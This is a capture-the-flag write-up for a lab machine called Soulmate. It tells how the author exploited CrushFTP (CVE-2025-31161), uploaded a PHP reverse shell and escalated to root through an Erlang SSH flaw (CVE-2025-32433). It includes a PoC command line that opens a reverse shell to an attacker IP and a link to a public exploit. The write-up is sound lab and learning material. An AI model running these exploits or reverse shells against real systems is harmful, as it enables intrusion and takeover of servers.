# Soulmate 

## Enumeration

Run nmap scan, noticed port 80 is open and got the domain name. Added the domain name to `/etc/hosts` and then started directory busting and subdomain busting. Through subdomain busting, identified the subdomain `ftp.soulmate.htb`. Visiting `soulmate.htb` but there are nothing exploitable. Then went on to visit `ftp.soulmate.htb` and there is a login page but no registration page, but it showed that it is running CrushFTP. Doing a quick google search and found that there is a public CVE for CrushFTP, CVE-2025-31161. Going to GitHub, found public exploits and used the script to add a new user with administrative privileges into the service and gained access to it.

## Exploitation

Once inside CrushFTP web interface, there's a user management page, went into there and explored a bit. Found out that the user 'ben' can upload files to 'webProd' folder, which is where the 'soulmate.htb' files are found. So uploaded a 'rev.php' file and then launched the page on another tab and obtained a reverse shell. Once in the reverse shell, there are no user flags. Explored around a bit and found `proc.txt` in the `tmp` folder. In this `proc.txt`, it showed a process running an escript, looked into that escript and found `ben`'s password. Changed user to `ben` and got the user flag.

## Privilege Escalation

Ran `linpeas` but didn't notice any obvious privilege escalation entrypoints. But there are a lot of uncommon ports open, one of them being port 2222. Investigated that port using `nc 127.0.0.1 2222` and got a banner 'SSH-2.0-Erlang/5.2.9', which after a quick Google search, also has public CVE-2025-32433. Searched GitHub for PoC scripts and decided to use [this](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC). Setup another listener in my Kali attacker machine, this time using `nc` because somehow `penelope` cannot catch this reverse shell, and then used `python cve-2025-32433.py 127.0.0.1 --shell --lhost 192.168.1.100 --lport 4444` to initiate the reverse shell connection, got it and was able to get the root flag.

